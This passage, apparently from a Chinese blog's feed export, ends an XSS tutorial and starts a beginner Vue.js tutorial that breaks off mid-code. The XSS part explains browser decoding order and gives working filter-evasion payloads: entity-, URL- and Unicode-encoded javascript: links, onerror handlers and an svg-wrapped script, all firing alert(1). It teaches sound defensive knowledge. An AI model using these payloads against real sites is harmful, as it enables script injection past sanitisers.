<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061lert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>但是，不能对协议类型进行任何编码，因为这样会导致URL认不出来是JavaScript伪协议，从而不会进行JS解析！！</strong></p>
<p>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败，因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号。同时，<strong>上边这种直接在字符串外进行编码的方式，只有 Unicode 编码方式被支持，其他编码方式则不行</strong>。</p>
<h2 id="XSS编码实践"><a href="#XSS编码实践" class="headerlink" title="XSS编码实践"></a>XSS编码实践</h2><p>我们从几个简单的例子回顾加深一下浏览器解析代码的过程：</p>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;a&gt;</code>标签语法，于是就先建立了一个DOM节点；然后对<code>href</code>里面的内容进行HTML解码；由于<code>href</code>属性的值是URL，因此会对<code>herf</code>属性的值进行URL解码；接着由于URL的协议类型是JavaScript伪协议，然后就会进行JS解码，最后执行语句。</p>
<p>整个解析顺序为3个环节：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
<ul>
<li>将<code>javascript:alert(&#39;xss&#39;)</code>转化为HTML实体，因为解析HTML之后，建立起<code>&lt;a&gt;</code>DOM节点，然后对DOM节点里面的HTML实体进行解析。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：这里还要多一个步骤进行URL编码，因为里面的<code>&amp;</code>和<code>#</code>都有特殊功能</strong></p>
<p>因此真正提交的URL应该是这样的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对<code>alert(1);</code>进行URL编码，因为在HTML解析之后会对<code>href</code>的值进行URL解码，不过实际上这里没有需要URL转义的内容，因此还是一样</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对<code>alert</code>做JS编码，因为在URL解码之后，发现URL资源类型为JavaScript，因此会调用JS解析器来对JS代码进行解析</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>混合编码</li>
</ul>
<p>由于浏览器解码的过程是：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
<p>因此我们可以反过来编码：JS解码 –&gt;URL解码 –&gt;HTML解码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">3. 对href标签中的除了协议名字(javascript:)以外的部分进行URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(1)&quot;</span>&gt;</span></span><br><span class="line">4. 对href的值进行HTML编码（再加上要URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个例子和案例一类似，只不过由于<code>onerror</code>是事件，本来就属于JS操作，因此只是比案例一少了个URL解码，下列情况都可以成功弹框：</p>
<ul>
<li>对<code>alert(1)</code>进行HTML编码(再加上URL编码)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对<code>alert</code>进行JS编码（Unicode）</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>混合编码，先进行JS编码然后再HTML编码(再加上URL编码)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br><span class="line">3. 对onerror的值进行HTML编码（再加上URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个例子就比较特别了，当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以这里并不会第一时间进行HTML解码，而是先进行JS解码，JS解码之后若有必要才进行HTML解码，（这里没有必要，因为没有检查到完整得HTML标签结构），最后执行语句。</p>
<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
<ul>
<li>对<code>alert</code>进行JS编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>&lt;svg&gt;</code>标签放在<code>&lt;script&gt;</code>标签前面，那么就可以对<code>&lt;script&gt;</code>标签里面的内容进行Html编码，这是因为在解析到<code>&lt;svg&gt;</code>标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML中实体编码会自动转义，重新来一遍标签开启状态，此时就会执行xss了。（当然了如果你要使用GET方法传参的话最后还要加上URL编码）</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>混合编码，先进行JS编码，再利用<code>&lt;svg&gt;</code>标签进行HTML编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. 利用 svg 标签进行HTML编码</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="XSS编码绕过原理"><a href="#XSS编码绕过原理" class="headerlink" title="XSS编码绕过原理"></a>XSS编码绕过原理</h2><p>看完上面的实践内容，估计都清楚浏览器解析代码的过程了吧，这里看2个XSS编码绕过的案例。</p>
<h3 id="利用HTML编码绕过"><a href="#利用HTML编码绕过" class="headerlink" title="利用HTML编码绕过"></a>利用HTML编码绕过</h3><ul>
<li>服务器后端关键代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>)</span>&#123;</span><br><span class="line">    input = input.toUpperCase()</span><br><span class="line">    <span class="keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里后端把输入的参数进行了大写处理，由于JavaScript代码对大小写敏感，也就是说<code>ALERT()</code>是不能触发弹窗的，这里就是利用HTML对大小也不敏感，所以HTML编码绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;img&gt;</code>标签语法，于是就先建立了一个DOM节点；然后去<code>onerror</code>事件的值进行HTML解码；接着交给JS解析器进行JS解码，最后执行语句。</p>
<h3 id="利用JS编码绕过"><a href="#利用JS编码绕过" class="headerlink" title="利用JS编码绕过"></a>利用JS编码绕过</h3><ul>
<li>服务器后端关键代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;Your name is:</span></span><br><span class="line"><span class="string">		 &lt;div id=&#x27;a&#x27;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		 &lt;script&gt;</span></span><br><span class="line"><span class="string">		 	document.getElementById(&#x27;a&#x27;).innerHTML=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.htmlspecialchars(<span class="variable">$value</span>).<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		 &lt;/script&gt;</span></span><br><span class="line"><span class="string">		 &quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br></pre></td></tr></table></figure>
<p>这里后端使用了<code>htmlspecialchars()</code>函数对输入的参数进行了HTML实体编码，目的是想让我们输入的标签变成普通的文本字符串，一般情况下是无法绕过的，但是这里后端把参数放在了<code>&lt;script&gt;</code>标签里面，并且操作DOM修改了外部的DOM节点，这就让我们有了可乘之机。可以使用JS编码进行绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> #源码</span><br><span class="line"></span><br><span class="line">\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e		#JS编码后</span><br></pre></td></tr></table></figure>
<p>这里浏览器接收到的数据是</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签语法，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以会先进行JS解码，解码之后就还原出了原来的<code>&lt;img&gt;</code>标签，浏览器发现是完整机构的HTML标签，于是就再创建DOM节点，然后对<code>onerror</code>事件的值进行HTML解码，最后执行<code>onerror</code>里面的JavaScript语句。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.cnblogs.com/flycat-2016/p/6507543.html" >XSS编码与绕过<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://saucer-man.com/information_security/103.html" >探索XSS利用编码绕过的原理<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://0verwatch.top/xss-encodeorder.html" >xss编码绕过原理以及从中学习到的几个例子<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>vue入门</title>
    <url>/2021/02/12/vue%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="一、vue基础"><a href="#一、vue基础" class="headerlink" title="一、vue基础"></a>一、vue基础</h2><h3 id="1-1-vue简介"><a href="#1-1-vue简介" class="headerlink" title="1.1 vue简介"></a>1.1 vue简介</h3><ol>
<li>JavaScript框架</li>
<li>简化Dom操作</li>
<li>响应式数据驱动</li>
</ol>
<h3 id="1-2-第一个vue程序"><a href="#1-2-第一个vue程序" class="headerlink" title="1.2 第一个vue程序"></a>1.2 第一个vue程序</h3><p>文档传送门：<a class="link"   href="https://cn.vuejs.org/" >https://cn.vuejs.org/<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li>导入开发版本的 Vue.js</li>
<li>创建 Vue 实例对象，设置 el 属性和 data 属性</li>
<li>使用简洁的模板语法把数据渲染到页面上</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            message:<span class="string">&quot;你好，john！&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="1-3-el：挂载点"><a href="#1-3-el：挂载点" class="headerlink" title="1.3 el：挂载点"></a>1.3 el：挂载点</h3><p>el 是用来设置 Vue 实例挂载（管理）的元素</p>
<p><strong>Vue 实例的作用范围是什么呢？</strong></p>
<p>​    Vue 会管理 el 宣子昂命中的元素及其内部的后代元素</p>
<p><strong>是否可以使用其他选择器？</strong></p>
<p>​    可以使用其他选择器，但是建议使用 ID选择器</p>
<p><strong>是否可以设置其他的 dom 元素呢？</strong></p>
<p>​    可以使用其他的双标签，不能使用 html 和 body</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span> <span class="attr">class</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// el:&quot;#app&quot;,</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// el:&quot;.app&quot;,</span></span></span><br><span class="line"><span class="javascript">         el:<span class="string">&quot;div&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            message:<span class="string">&quot;el:挂载点！&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="1-4-data：数据对象"><a href="#1-4-data：数据对象" class="headerlink" title="1.4 data：数据对象"></a>1.4 data：数据对象</h3><ul>
<li>Vue 中用到的数据定义在 data 中</li>
<li>data 中可以写复杂类型的数据</li>
<li>渲染复杂类型数据时，遵守 js 的语法即可</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;school.name&#125;&#125; &#123;&#123;school.moblie&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;campus[0]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;campus[2]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;hello world&quot;</span>,</span></span><br><span class="line">            school:&#123;</span><br><span class="line"><span class="javascript">                name:<span class="string">&quot;szu&quot;</span>,</span></span><br><span class="line"><span class="javascript">                moblie:<span class="string">&quot;888888&quot;</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            campus:[<span class="string">&quot;丽湖校区&quot;</span>,<span class="string">&quot;粤海校区&quot;</span>,<span class="string">&quot;沧海校区&quot;</span>]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="二、本地应用"><a href="#二、本地应用" class="headerlink" title="二、本地应用"></a>二、本地应用</h2><h3 id="2-1-内容绑定，事件绑定"><a href="#2-1-内容绑定，事件绑定" class="headerlink" title="2.1 内容绑定，事件绑定"></a>2.1 内容绑定，事件绑定</h3><h4 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h4><ul>
<li>v-text 指令的作用时：设置标签的内容（textContent）</li>
<li>默认写法会替换全部内容，使用差值表达式可以替换指定内容</li>
<li>支持写表达式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span 